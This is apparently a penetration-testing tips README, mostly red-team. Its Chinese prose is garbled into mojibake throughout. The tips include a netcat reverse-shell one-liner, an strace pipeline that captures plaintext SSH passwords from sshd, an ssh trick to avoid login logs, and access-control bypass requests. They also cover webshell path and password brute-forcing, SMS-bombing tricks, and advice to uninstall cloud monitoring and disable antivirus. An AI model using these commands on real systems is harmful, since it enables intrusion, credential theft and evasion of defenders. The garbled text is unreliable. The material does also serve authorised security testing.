# Pentest101

æ¯å‘¨(ä¹Ÿè®¸ä¸)åˆ†äº«ä¸€äº›å…³äºæ¸—é€æµ‹è¯•çš„çŸ¥è¯†ç‚¹

---

æ— è®ºçº¢é˜Ÿè¿˜æ˜¯è“é˜Ÿ,å¹²æ´»ä¹‹å‰å…ˆè®©å®¢æˆ·ä¿å­˜å¥½æ—¥å¿—å’Œå¤‡ä»½.(åœ¨å•°å—¦æˆ‘ä¹Ÿè¦è¯´,è¡€çš„æ•™è®­)

---

# å¤§çº²

* [çº¢é˜Ÿ](#çº¢é˜Ÿ)
* [è“é˜Ÿ](#è“é˜Ÿ)
* [Linux](#linux)

---

# çº¢é˜Ÿ

æœ‰æ—¶å€™è¿›åˆ°åå°,å¯¼å‡ºçš„ä¸€äº›æ•°æ®å¯èƒ½æ˜¯ json æ ¼å¼çš„,è¿™ä¸ªæ—¶å€™å¯ä»¥ç”¨ linux ä¸‹çš„ jq å·¥å…·,å¿«é€Ÿå¤„ç† json æ•°æ®,å¯¼å‡ºæˆä½ éœ€è¦çš„æ ¼å¼.

ä¾‹å¦‚:
```bash
wget https://raw.githubusercontent.com/modood/Administrative-divisions-of-China/master/dist/pcas.json
cat pcas.json | jq '."åŒ—äº¬å¸‚"' > out.txt        # è·å–åŒ—äº¬å¸‚æ‰€æœ‰è¾–åŒºã€è¡—é“ä¿¡æ¯
cat pcas.json | jq '."åŒ—äº¬å¸‚"."å¸‚è¾–åŒº"' > out.txt
cat pcas.json | jq '."åŒ—äº¬å¸‚"."å¸‚è¾–åŒº"."ä¸œåŸåŒº"' > out.txt      # è·å–åŒ—äº¬å¸‚ä¸œåŸåŒºæ‰€æœ‰è¡—é“ä¿¡æ¯
```

é€šè¿‡è·å–çš„ä¿¡æ¯,è¿›ä¸€æ­¥æ„é€ å­—å…¸æˆ–è€…å…¶ä»–çš„,ç”¨äºæ‰©å¤§æˆ˜æœ

---

å¾ˆå¤šå¸ˆå‚…çš„ blog æä¾›äº† rss è®¢é˜…,æˆ‘ä¸ªäººæ¨èä¸€ä¸ª rss é˜…è¯»çš„chromeæ’ä»¶: [Feedbro](https://chrome.google.com/webstore/detail/feedbro/mefgmmbdailogpfhfblcnnjfmnpnmdfa?hl=en)

åŠæ—¶é˜…è¯»æ–°çš„æ–‡ç« ,è·Ÿä¸Šå¸ˆå‚…ä»¬çš„æ­¥ä¼.

---

projectdiscovery çš„ [chaos](https://chaos.projectdiscovery.io/#/) æ˜¯æ”¶é›† src èµ„äº§çš„ä¸é”™é€”å¾„

---

åœ¨ vps ä¸Šè·‘æ‰«æä»»åŠ¡ç»å¸¸ç”±äºç½‘ç»œæ³¢åŠ¨æ‰ ssh è¿æ¥, æ­¤æ—¶ shell é‡Œæ‰§è¡Œçš„ä»»åŠ¡ä¹Ÿè¢«æ–­æ‰äº†, é’ˆå¯¹è¿™ç§æƒ…å†µï¼Œå¯ä»¥è¯•è¯•è™šæ‹Ÿ shell, æ¯”å¦‚ screen , tmux , è™šæ‹Ÿ shell åœ¨ä½ æ–­æ‰ ssh è¿æ¥æ—¶ä¸ä¼š kill æ‰ä»»åŠ¡, å¾ˆå¥½ç”¨,å¯ä»¥è¯•ä¸€è¯•

---

æ‹¿ä¸‹ linux æœºå™¨,å¯ä»¥è¿è¡Œä¸‹ `last` å¦‚æœæ˜¯å†…ç½‘æœºå™¨,å¯ä»¥å‘ç°è¿ç»´ç®¡ç†å‘˜çš„ ip æ®µ,ç²¾å‡†å®šä½ç›®æ ‡

ä¹Ÿå¯ä»¥çœ‹ä¸‹é˜²ç«å¢™ä¿¡æ¯ `iptables --list` ä¹Ÿä¼šæœ‰æ‰€æ”¶è·

---

ç¿»æ•°æ®åº“å¯†ç å¯ä»¥æ³¨æ„ `history` è®°å½•ä¹Ÿå¯ä»¥çœ‹ä¸‹ `/root/.mysql_history` æ–‡ä»¶

---

å¶å°”è·‘1ã€2ä¸ªè„šæœ¬å®‰è£…ä¸€ä¸‹æ¨¡å—è¿˜æ˜¯æŒºæ¼äººçš„

å¦‚æœç»å¸¸å†™ python è„šæœ¬,å¯ä»¥ä½¿ç”¨ pipreqs ç”Ÿæˆè‡ªå·±çš„ requirements.txt æ–‡ä»¶,è¿™æ ·æ–¹ä¾¿åœ¨æ›´æ¢ä¸»æœºçš„æ—¶å€™å¿«é€Ÿéƒ¨ç½²å¥½è¿è¡Œç¯å¢ƒ

---

æµè§ˆå™¨å†…æ‰“å¼€ cmd
```
ms-settings:clipboard?activationSource=
```

ç«ç‹
```
telnet:///
irc:///
ircs:///
mailto:///
webcal:///
```

---

æœ‰ wsdl/soap ä¸çŸ¥é“æ€ä¹ˆæµ‹?é™¤äº†è€ç‰ˆæœ¬awvsä»¥å¤–å¯ä»¥ä½¿ç”¨ [soapui](https://github.com/SmartBear/soapui#build-and-run) ç›´æ¥æŠ“å–ç›®æ ‡æ¥å£,ä¹Ÿå¯ç”¨ burp æ’ä»¶ [Wsdler](https://github.com/NetSPI/Wsdler)

è¿˜æœ‰ä¸€ä¸ª ReadyAPI å¯ä»¥è‡ªåŠ¨ fuzz,ä¸è¿‡ä½¿ç”¨å®åœ¨æ˜¯å¤ªä¸æ–¹ä¾¿äº†

---

é¿å…è®°å½•ç™»å½•æ—¥å¿—çš„å°æŠ€å·§
```bash
ssh -T user@host /bin/bash -i
```

-T ä»£è¡¨ä¸è¦åˆ†é… ttyï¼Œ-i ä»£è¡¨è¦ä¸€ä¸ªäº¤äº’å‹çš„ bash
> æ¥è‡ªæ–‡ç«  : [Linux ç³»ç»Ÿæ—¥å¿—å°ç»“](https://www.tr0y.wang/2021/06/15/linux-system-log/)

---

å¦‚ä½•å…³é—­ http://burp é˜²æ­¢èœœç½æ¢æµ‹
- Proxy - Options - Miscellaneous - Disable web interface at http://burp

![](./assets/img/7.png)

---

æ£€æµ‹æš—é“¾çš„å°æŠ€å·§,ä½¿ç”¨çˆ¬è™«çš„ user-agent éå†è®¿é—®ç›®æ ‡,å¯¹æ¯” title å’Œå†…å®¹
- https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/http/Spider.txt

---

DNSæ”¶é›†çš„ä¼˜å…ˆçº§ è¢«åŠ¨+çˆ¬å–+è¿‡æ»¤ > ä¸»åŠ¨æ‰«æ+çˆ†ç ´
- å¯ä»¥ä½¿ç”¨è¿™ç§æ€è·¯ rapid7å…¬å…±æ•°æ®é›†+jsçˆ¬å–+Githubç­‰ç¬¬ä¸‰æ–¹çˆ¬å–+subfinder+OneForAll+ksubdomainè¿‡æ»¤

---

å¯¹äºæœªçŸ¥çš„webshellï¼Œå¯ä»¥å°è¯•çˆ†ç ´è·¯å¾„ã€å¯†ç 
- webshellè·¯å¾„å­—å…¸ : https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/Webshell/Fuzz_dir.txt
- webshellå¯†ç å­—å…¸ : https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/Webshell/Fuzz_webshell_pass.txt

ä¹ŸåŠ ä¸€äº›å‚æ•°,å°è¯•æŠ¥é”™,çœ‹ä¼šä¸ä¼šæœ‰å¯†ç 

---

nc ç”¨çš„ä¸çˆ½å¯ä»¥å°è¯•æ¢ä¸ª reverse-shell å·¥å…·,æ¨èä¸ª https://github.com/nodauf/Girsh ,goå†™çš„,å¯ä»¥è‡ªåŠ¨æ£€æµ‹OSå¹¶æ‰§è¡Œæ­£ç¡®çš„å‘½ä»¤ï¼Œå°†å…¶å‡çº§ä¸ºä¸€ä¸ªå®Œæ•´çš„äº¤äº’å¼åå‘shellã€‚

![](./assets/img/5.png)

---

ä»åç¼–è¯‘çš„ apk æ–‡ä»¶ä¸­æå–ç›¸å…³åŸŸåé“¾æ¥/IP
```bash
grep -E "([0-9]{1,3}[\.]){3}[0-9]{1,3}" -r xxx --color=auto
grep -E "https?://[a-zA-Z0-9\.\/_&=@$%?~#-]*" -r xxx --color=auto
```

---

é€šè¿‡æ­£åˆ™ä» apk ä¸­æå–ä¸€äº›æ•æ„Ÿä¿¡æ¯
```bash
apktool d app_name.apk
grep -EHirn "accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into" APKfolder/
```

---

å¦‚æœç™»å½•ç³»ç»Ÿè®¾ç½®äº† IP åœ°å€ç™½åå•,æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹ http å¤´å­—æ®µä¼ªé€  IP åœ°å€
- http å¤´å­—æ®µå­—å…¸ : https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/http/Fuzz_head.txt

æˆ–è€…ç›´æ¥ä¿®æ”¹ host å¤´
```
curl -v -H "Host: localhost" https://target/
wget -d --header="Host: localhost" https://target/
```

---

æœ‰æ—¶å€™æ–‡ä»¶å¤ªå¤§,æƒ³å…ˆç¡®è®¤ä¸€ä¸‹æ–‡ä»¶ç»“æ„å’Œéƒ¨åˆ†å†…å®¹,è¿™æ—¶å¯ä»¥ä½¿ç”¨ remotezip,ç›´æ¥åˆ—å‡ºè¿œç¨‹ zip æ–‡ä»¶çš„å†…å®¹ï¼Œè€Œæ— éœ€å®Œå…¨ä¸‹è½½,ç”šè‡³å¯ä»¥è¿œç¨‹è§£å‹,ä»…ä¸‹è½½éƒ¨åˆ†å†…å®¹
```bash
pip3 install remotezip
remotezip -l "http://site/bigfile.zip"          # ï¦œå‡ºè¿œç¨‹zipæ–‡ä»¶çš„å†…å®¹
remotezip "http://site/bigfile.zip" "file.txt"  # ä»è¿œç¨‹zipâ½‚ä»¶è§£å‹å‡ºfile.txt
```

---

URLè·³è½¬æ¼æ´å­—å…¸: https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/api_param/Fuzz_Redirect.txt

---

burp åœ¨å¿½ç•¥ç›®æ ‡çš„æ—¶å€™æ˜¯é…ç½® Intercept Client Requests , ä½†æ˜¯è¿™ä¸ªé€‰é¡¹ä¸æ”¯æŒæ‰¹é‡å¯¼å…¥, åªèƒ½ä¸€æ¡ä¸€å¥—çš„æ·»åŠ , éå¸¸åäººç±», æ‰€ä»¥ windows ä¸‹å¯ä»¥é€šè¿‡ Proxifier é…ç½® Rules åšåˆ°å¿½ç•¥æŒ‡å®šçš„ host

![](./assets/img/4.png)

é™„èµ ä¸€ä¸ª Target hosts åˆ—è¡¨
- https://github.com/ffffffff0x/AboutSecurity/blob/master/Payload/Burp/Proxifier_filter.txt

---

npm å’Œ github åŠ é€Ÿå¯ä»¥ä½¿ç”¨ jsdelivr çš„ cdn è¿›è¡ŒåŠ é€Ÿ,ä½† jsdelivr ä¸æ”¯æŒ release çš„å‘å¸ƒæ–‡ä»¶ä¸‹è½½,å¯ä»¥é‡‡ç”¨ cf worker éƒ¨ç½²çš„ä»£ç†æœåŠ¡è¿›è¡ŒåŠ é€Ÿ

---

åœ¨ linux ä¸­ä¸çŸ¥é“å½“å‰ç”¨æˆ·å¯ç”¨ä»€ä¹ˆå‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ï¼Œè¿™æ¡å‘½ä»¤å¯ä»¥åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„å‘½ä»¤(æœ‰ç‚¹æ‹—å£)
```
compgen -c
```

---

ç«ç»’æ‹¦æˆªæ‰«æï¼Œå¦‚ä½•å…³é—­æ‹¦æˆªï¼Ÿ
- ç«ç»’>ç½‘ç»œé˜²æŠ¤>åŸºç¡€é˜²æŠ¤ä¸­å…³é—­

![](./assets/img/1.png)

---

druid æœªæˆæƒè®¿é—®å¸¸è§è·¯å¾„
- /druid/websession.html
- /system/druid/websession.html
- /webpage/system/druid/websession.html

---

çˆ†ç ´ç›®æ ‡ç”¨æˆ·åæ—¶åº”è€ƒè™‘å¦‚ä¸‹å¯èƒ½ï¼š
- æ’åº“
- å¸¸è§æ‰‹æœºå·
- å¸¸è§ç™»å½•è´¦å·(adminã€managerã€testã€deme)
- æ•°å­—ç»„åˆ(0-9ã€00-99ã€000-999ã€0000-9999ã€00000-99999)
- æ‹¼éŸ³(zhangsanã€zhang.sanã€zhangs)
- ä¸­æ–‡(å¼ ä¸‰ã€æå››ã€å¼ san)
- è‹±æ–‡å(Tomã€Jeoã€Cherry)
- å•ä½å(zssx123ã€zssx@123)
- åœ°å(beijing123ã€beijing@123)
- ç»„åˆ(åœ°å+å•ä½å)
- åŸŸå(baidu@123ã€JD@123)
- ç”Ÿæ—¥ç»„åˆ

---

æ•´ç†å­—å…¸æ—¶ï¼Œæ¨èç”¨linuxä¸‹çš„å·¥å…·å¿«é€Ÿåˆå¹¶å’Œå»é‡
```bash
cat file1.txt file2.txt fileN.txt > out.txt
sort out.txt | uniq > out2.txt
```

---

ä¿¡æ¯æ”¶é›†å°æŠ€å·§ï¼Œä»”ç»†è§‚å¯Ÿç›®æ ‡é¡µé¢çš„jsè·¯å¾„ï¼Œå¤šæ‰¾å‡ ä¸ªjsç›®å½•ï¼Œä¸“é—¨ç”¨jså­—å…¸è¿›è¡Œçˆ†ç ´ï¼Œè·å–çš„jsè„šæœ¬åˆ—è¡¨ï¼Œå†è°ƒç”¨å·¥å…·å»åŒ¹é…è·¯å¾„å’Œå‡­è¯ã€‚

---

æœ‰æ—¶ä¸€äº›ä¸Šä¼ ç‚¹æ²¡æœ‰è¿‡æ»¤,ä½†ä½ è®¿é—®æ–‡ä»¶æ˜¯é€šè¿‡å‡½æ•°è°ƒç”¨è·å–æ–‡ä»¶,è¿™ä¸ªæ—¶å€™å¯ä»¥å…ˆæµ‹ä¸‹ä»»æ„æ–‡ä»¶è¯»,ç„¶åå°è¯•getæ”¹ä¸ºpoståœ¨æµ‹è¯•ä»»æ„æ–‡ä»¶è¯»,å¦‚æœå­˜åœ¨,å°è¯•é€šè¿‡ä»»æ„æ–‡ä»¶è¯»æ‰¾è·¯å¾„

---

æ‰“æŸä¸€ä¸ªè¡Œä¸šæƒ³è¦æœ‰æˆæœï¼Œæœ€å¥½è¦æ·±å…¥äº†è§£è¿™ä¸ªè¡Œä¸šï¼Œæˆ‘ä¸¾ä¸ªä¾‹å­ï¼Œæ¯”å¦‚æä¼ å¥‡/dnfè¿™ç§ç§æœçš„ï¼Œä»–ä»¬è®²ç®¡ç†å‘˜éƒ½å«gmï¼Œä¸åƒæITçš„å«adminï¼Œé‚£ä½ çˆ†ä¸€äº›ç§æœæ¸¸æˆçš„ç½‘é¡µåå°ã€ç®¡ç†è´¦å·å°±éœ€è¦æä¸€äº›è¡Œä¸šé»‘è¯ç”Ÿæˆä¸€ä¸‹ï¼Œæ¯”å¦‚/gm/æˆ–è€…/chongzhi/gm.php,ç”¨ITè¡Œä¸šçš„å­—å…¸ï¼Œæ°´åœŸä¸æœğŸ¤£ï¼Œè¿˜æœ‰è èœè¡Œä¸šï¼Œæ³¨å†Œç”¨æˆ·éœ€è¦6ä½é‚€è¯·ç ï¼Œå¾ˆå¤šéƒ½æ˜¯888888ã€666666è¿™ç§å‰åˆ©æ•°å­—ï¼Œé€†å‘ä¸€ä¸‹æ€è·¯ï¼ŒçŒœä¸€çŒœç›®æ ‡å—ä¼—å–œæ¬¢ä»€ä¹ˆã€‚

---

æˆ‘ä»¬åœ¨åæ¸—é€è¿‡ç¨‹ä¸­ç»å¸¸è¦ä¼  payload åˆ°ç›®æ ‡ï¼Œä¸´æ—¶èµ·çš„æ–‡ä»¶æœåŠ¡å™¨éƒ½æ˜¯ python ä¸€æ¡å‘½ä»¤çš„äº‹
- Python 2.x
    ```bash
    python -m SimpleHTTPServer 8000
    # åœ¨å½“å‰ç›®å½•èµ·ä¸ª 8000 ç«¯å£çš„ HTTP æœåŠ¡
    ```
- Python 3.x
    ```bash
    python -m http.server 8000 --bind 0.0.0.0
    ```
- æ¨èä¸€ä¸ªå¯ä»¥åŠ å¯†ç çš„ï¼Œä¸€æ¡å‘½ä»¤pythonæœåŠ¡å™¨æ¨¡å—
    ```
    pip3 install updog
    updog --port 8888 --password test1234
    ```

---

ä¸€èˆ¬æ¥è¯´,æŸäº›åœºæ™¯å¤šä¸ªæœåŠ¡æ˜¯ååŒçš„å…³ç³»,æ¯”å¦‚å°±è¿™ä¸ª LiveCMS æœåŠ¡ä¸€å®šå’Œä¸‹é¢çš„ç›‘æ§è®¾å¤‡æœ‰è¿æ¥ï¼Œä¸ç„¶æ—¥å¿—ä¸ä¼šè¿™ä¹ˆå¤§ï¼Œå¯ä»¥æä¸€æä¸‹çº§ç›‘æ§ï¼Œä¹Ÿå¯ä»¥ä¸“é—¨æä¸€æè¿™ä¸ª LiveCMS å’Œ LiveSMSã€LiveGBS è¯•è¯•
LiveCMS ç«¯å£ä½¿ç”¨
- TCP ç«¯å£ : 5060(SIP), 10000(HTTP), 26379(Redis)
- UDP ç«¯å£ : 5060(SIP)

LiveSMS : SIP æµåª’ä½“æœåŠ¡, æ ¹æ®éœ€è¦å¯éƒ¨ç½²å¤šå¥—
- TCP ç«¯å£ : 5070(SIP), 10001(HTTP), 11935(RTMP Live), 30000-40000(RTP over TCP)
- UDP ç«¯å£ : 5070(SIP), 50000-60000(RTP/RTCP over UDP)

---

æœ‰æ—¶å€™æˆ‘ä»¬æ‹¿äº†ä¸€å° docker æœºå™¨ï¼Œå‘ç°æ²¡æœ‰ ifconfig å‘½ä»¤ä¹Ÿæ²¡æœ‰ ip å‘½ä»¤ï¼Œä¸æ¸…æ¥šæ€ä¹ˆçœ‹ IPï¼Œè¿™æ—¶å€™å¯ä»¥é€šè¿‡æŸ¥çœ‹ proc æ–‡ä»¶çš„æ–¹å¼æ¥æŸ¥çœ‹
```bash
cat /proc/net/fib_trie
cat /etc/sysconfig/network
```

---

æ¸—é€æ—¶é‡åˆ°æŸäº›ä¸Šä¼ ç‚¹æœªä½œè¿‡æ»¤ï¼Œä½†è´Ÿè½½å‡è¡¡åšäº†è¿‡æ»¤åç¼€åçš„æƒ…å†µï¼Œå¯ä»¥ä¸Šä¼  webshell å‘½åä¸º index.phpï¼Œç„¶åè®¿é—® xxx.com/xxx/upload, å°è¯• bypass åä»£çš„ç­–ç•¥

---

å½“æ¸—é€æ—¶é‡åˆ°äº† 403 æˆ–è€… 302ã€401 çš„æ‹’ç»è®¿é—®ï¼Œä¸è¦æ€•ï¼Œå¤š FUZZ å‡ æ¬¡
- ä» HTTP Header å±‚é¢ bypass
    ```bash
    GET /admin HTTP/1.1
    Host: web.com   # ===> 403

    GET /anything HTTP/1.1
    Host: web.com
    X-Original-URL: /admin  # ===> 200

    GET /anything HTTP/1.1
    Host: web.com
    Referer: https://web.com/admin  # ===> 200

    GET https://qq.com HTTP/1.1
    Host: web.com   # ===> SSRF
    ```

- ä» URL å‚æ•°å±‚é¢ bypass
    ```bash
    /admin/panel    # ===> 403
    /admin/monitor  # ===> 200

    /admin/monitor/;panel   # ===> 302
    ```
    ```bash
    web.com/admin   # ===> 403

    web.com/ADMIN       # ===> 200
    web.com/admin/      # ===> 200
    web.com/admin/.     # ===> 200
    web.com//admin//    # ===> 200
    web.com/./admin/./  # ===> 200
    web.com/./admin/..  # ===> 200
    web.com/%2f/admin/  # ===> 200
    web.com/admin.json  # ===> 200(ruby)

    web.com/%2e/admin   # ===> 200
    web.com/%252e/admin # ===> 200
    web.com/%ef%bc%8fadmin  # ===> 200

    web.com/admin       # ===> 302
    web.com/admin..;/   # ===> 200
    ```

- ä»åè®®å±‚é¢ bypass
    ```bash
    http://web.com/admin    # ===> 403
    https://web.com/admin   # ===> 200
    ```

---

å½“æˆ‘ä»¬æ‹¿ä¸‹ windows æœºå™¨æ—¶å¯ä»¥é€šè¿‡æŠ“å†…å­˜ä¸­çš„å¯†ç è¿›è¡Œæ¨ªå‘ï¼Œä½† linux å´ä¸å¯èƒ½æŠ“åˆ°å†…å­˜ä¸­çš„å¯†ç ï¼Œä½†æ˜¯ Debian ç³»åˆ—ä¸‹çš„ linux ç³»ç»Ÿå¯ä»¥é€šè¿‡ç›‘å¬ sshd è¿›ç¨‹çš„æ•°æ®æŠ“å–å‡ºæ˜æ–‡å¯†ç ï¼Œæ¯”å¦‚ä½ æ‹¿ä¸‹äº†ä¸€å°ç®¡ç†å‘˜æœºå™¨ï¼Œä¸Šé¢æœ‰ xshellï¼Œä½ å¯ä»¥æ‰‹åŠ¨å¼€ä¸€ä¸ªç›‘å¬ï¼Œåœ¨å¼€ä¸€ä¸ªç™»å½•ï¼Œç›‘å¬çš„çª—å£ä¸Šå°±æŠ“å‡ºå¯†ç äº†
```bash
strace -xx -fp `cat /var/run/sshd.pid` 2>&1| grep --line-buffered -P 'write\(\d, "\\x00' | perl -lne '$|++; @F=/"\s*([^"]+)\s*"/g;for (@F){tr/\\x//d}; print for @F'|grep --line-buffered -oP '.{8}\K([2-7][0-9a-f])*$'|grep --line-buffered -v '^64$'|perl -pe 's/([0-9a-f]{2})/chr hex $1/gie'
```

å½“ç„¶ä½ ä¹Ÿå¯ä»¥ç›´æ¥ç”¨å·¥å…·æŠ“ xshell å­˜çš„å¯†ç 
- [Arvanaghi/SessionGopher](https://github.com/Arvanaghi/SessionGopher) - ä½¿ç”¨ WMI æå– WinSCPã€PuTTYã€SuperPuTTYã€FileZilla å’Œ Microsoft remote Desktop ç­‰è¿œç¨‹è®¿é—®å·¥å…·ä¿å­˜çš„ä¼šè¯ä¿¡æ¯çš„ ps è„šæœ¬
- [uknowsec/SharpDecryptPwd](https://github.com/uknowsec/SharpDecryptPwd) - å¯¹å¯†ç å·²ä¿å­˜åœ¨ Windwos ç³»ç»Ÿä¸Šçš„éƒ¨åˆ†ç¨‹åºè¿›è¡Œè§£æ,åŒ…æ‹¬ï¼šNavicat,TeamViewer,FileZilla,WinSCP,Xmangager ç³»åˆ—äº§å“(Xshell,Xftp)ã€‚

---

æ¸—é€æ—¶å°½é‡ä¸è¦æš´éœ²è‡ªå·±çš„ IP åœ°å€ï¼ŒæŒ‚ä»£ç†æ˜¯å¿…é¡»çš„
- linux ä¸‹è¦æŸ¥çœ‹è‡ªå·±ç»ˆç«¯æ˜¯å¦èµ°ä»£ç†å¯ä»¥ curl https://ifconfig.me/ çœ‹ä¸‹è¿”å›çš„ IP åœ°å€
- windows å°±ç›´æ¥è®¿é—® https://ifconfig.me/ å³å¯

---

linux ä¸‹ä»£ç†ä¸ç”¨å¤šè¯´, proxychains-ngï¼Œwindows ä¸‹æ¨èç”¨ Proxifier

---

MSF å’Œ CS ä¸­ Stage ä¸ Stageless çš„åŒºåˆ«
- Stage ï¼š å…ˆä¼ ä¸€ä¸ª shellcodeï¼Œç„¶åå›è¿ç«¯å£ï¼ŒåŠ è½½æ¶æ„ metsrvï¼Œç„¶åå†è¯·æ±‚ stdapi äº privï¼Œè¿›è¡Œä¸Šçº¿
- Stageless ï¼š å°† shellcodeã€metsrvã€stdapiã€priv æ‰“åŒ…ï¼Œä¸€æ¬¡æ€§ä¼ å®Œ
- å¦‚æœæƒ³è®© msf ç›´æ¥å›å¼¹åˆ° NCï¼Œé‚£ä¹ˆå¿…é¡»è¦ç”¨ stageless

---

åˆ¤æ–­ç›®æ ‡ä¸»æœºæ˜¯ä¸æ˜¯è™šæ‹Ÿæœºã€å®¹å™¨
- windows
    - cmd : systeminfo
    - Powershell : get-wmiobject win32_computersystem | fl model
- linux
    ```bash
    lshw -class system | grep -i VM & grep -i virtual
    dmesg | grep -i VM & grep -i virtual
    dmidecode -s system-product-name
    ls /tmp
    systemd-detect-virt
    virt-what
    ls -alh /.dockerenv
    cat /proc/1/cgroup
    ```

---

msf æ¡†æ¶å…¶å®æœ‰è®¸å¤š UI ç•Œé¢çš„å·¥å…·, å¯ä»¥å¸®åŠ©ä¸ä¹ æƒ¯å‘½ä»¤è¡Œçš„æ¸—é€æµ‹è¯•äººå‘˜è¿›è¡Œæ¸—é€ï¼Œæˆ‘ä¸¾å‡ ä¸ªä¾‹å­
- https://github.com/FunnyWolf/Viper
- https://github.com/WayzDev/Kage

---

åœ¨è¿›è¡Œäº‘ä¸»æœºåæ¸—é€æ—¶ï¼Œå¦‚æœè§¦å‘æ•æ„Ÿæ“ä½œï¼Œä¼šæœ‰çŸ­ä¿¡æé†’åˆ°ç®¡ç†å‘˜æ‰‹æœºä¸Šï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥é…Œæƒ…è€ƒè™‘å¸è½½äº‘ä¸»æœºçš„ç›‘æ§ (æœ‰æ—¶ä½ ç”¨äº‘ä¸»æœºè£… SSR ä¼šæ— æ³•è¿æ¥ä¹Ÿæ˜¯è¿™ä¸ªåŸå› )

---

rlwrap å·¥å…·ï¼Œå¯ä»¥å®Œç¾è§£å†³å„ç±» shell ä¸­æ— æ³•ä¸Šä¸‹å·¦å³çš„é—®é¢˜

ä¾‹å¦‚ ï¼Œå›å¼¹äº† shellï¼Œæ‰‹è´±æŒ‰äº†ä¸Šï¼Œè¿™ç§æƒ…å†µ(æˆ‘æƒ³ä½ ä¸€å®šé‡åˆ°è¿‡ğŸ¤£ğŸ¤£ğŸ¤£ğŸ¤£)
- å®‰è£…ï¼š
    ```bash
    apt install rlwrap
    ```
- ä½¿ç”¨ï¼š
    ```bash
    rlwrap [Command]
    ```

---

cAdvisor æ˜¯ Google å‡ºå“çš„ç”¨äºç›‘æ§ Docker å®¹å™¨çš„æœåŠ¡ï¼Œæ¸—é€æ—¶é‡åˆ°è¿™ä¸ªæœåŠ¡åŸºæœ¬ä¸Šæ˜¯å­˜åœ¨å®¹å™¨ç¯å¢ƒ

---

æ–°ç‰ˆ kali 2020 ç‰ˆåä½¿ç”¨ root è´¦å·é»˜è®¤ä¸ç»™å¯†ç ï¼Œå¦‚æœä½ æƒ³,å¯ä»¥ç›´æ¥è¿›è¡Œä¿®æ”¹ : sudo passwd root

---

nc å…·æœ‰å¤šä¸ªç‰ˆæœ¬, æ¯”å¦‚: traditionalã€openbsdã€ncat
- traditional æœ€è€çš„ç‰ˆæœ¬,æ”¯æŒæœ€åŸºæœ¬çš„åŠŸèƒ½
- openbsd å®‰å…¨ç‰ˆæœ¬,å›å¼¹è¦ç”¨ä¸€å¤§æ®µå‘½ä»¤
    ```bash
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
    ```
- ncat æ–°ç‰ˆæœ¬, é‡æ„äº†æ—§ç‰ˆçš„ä»£ç å¹¶æ”¯æŒäº†è®¸å¤šæ–°åŠŸèƒ½, debian ç³»åˆ—å‘è¡Œç‰ˆä¸‹é€šè¿‡ä»¥ä¸‹å‘½ä»¤è¿›è¡Œå®‰è£…é…ç½®
    ```bash
    apt install -y ncat
    update-alternatives --set nc /usr/bin/ncat
    ```

---

ç¨‹åºæº¢å‡ºï¼Œint æœ€å¤§å€¼ä¸º 2147483647ï¼Œå¯å°è¯•ä½¿ç”¨è¯¥å€¼è¿›è¡Œæ•´æ•°æº¢å‡ºï¼Œè§‚å¯Ÿç°è±¡ã€‚
> æ¥è‡ªé¡¹ç›® : [Power7089/PenetrationTest-Tips](https://github.com/Power7089/PenetrationTest-Tips)

---

å›¾ç‰‡éªŒè¯ç å¯è®¾ç½®ä¸ºç©ºï¼Œå¦‚ï¼šcode=undefined
> æ¥è‡ªé¡¹ç›® : [Power7089/PenetrationTest-Tips](https://github.com/Power7089/PenetrationTest-Tips)

ä¹Ÿå¯ä»¥ä½¿ç”¨å­—å…¸è¿›è¡Œ fuzz
- https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/api_param/Fuzz_imagesize.txt

---

ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼š/porc/self/cmdline -- å½“å‰è¿›ç¨‹çš„ cmdline å‚æ•°ï¼Œ/var/lib/mlocate/mlocate.db -- å…¨æ–‡ä»¶è·¯å¾„ã€‚
> æ¥è‡ªé¡¹ç›® : [Power7089/PenetrationTest-Tips](https://github.com/Power7089/PenetrationTest-Tips)

---

- 138888888889   12 ä½ç»è¿‡çŸ­ä¿¡ç½‘å…³å–å‰ 11 ä½ï¼Œå¯¼è‡´çŸ­ä¿¡è½°ç‚¸
- çŸ­ä¿¡è½°ç‚¸ç»•è¿‡ï¼šæ‰‹æœºå·å‰åŠ  + 86 æœ‰å¯èƒ½ä¼šç»•è¿‡ï¼Œæ‰‹æœºå·è¾“å…¥é‚®ç®±ï¼Œé‚®ç®±å¤„è¾“å…¥æ‰‹æœºå·
- æ‰‹æœºå·ç å‰ååŠ ç©ºæ ¼ï¼Œ86ï¼Œ086ï¼Œ0086ï¼Œ+86ï¼Œ0ï¼Œ00ï¼Œ/r,/n, ä»¥åŠç‰¹æ®Šç¬¦å·ç­‰
- æ‰‹æœºå·å‰åŠ è‹¥å¹² + ä¼šé€ æˆçŸ­ä¿¡è½°ç‚¸
- è·å–çŸ­ä¿¡éªŒè¯ç æ—¶ï¼Œç”¨é€—å·éš”å¼€ä¸¤ä¸ªæ‰‹æœºå·ï¼Œæœ‰å¯èƒ½ä¸¤ä¸ªæ‰‹æœºå·èƒ½è·å–åˆ°åŒä¸€ä¸ªéªŒè¯ç 
> æ¥è‡ªé¡¹ç›® : [Power7089/PenetrationTest-Tips](https://github.com/Power7089/PenetrationTest-Tips)

---

# è“é˜Ÿ

æ¨èä¸€ä¸ªä¸é”™çš„æ¶æ„æ–‡ä»¶åˆ†æå·¥å…· https://github.com/mandiant/capa

---

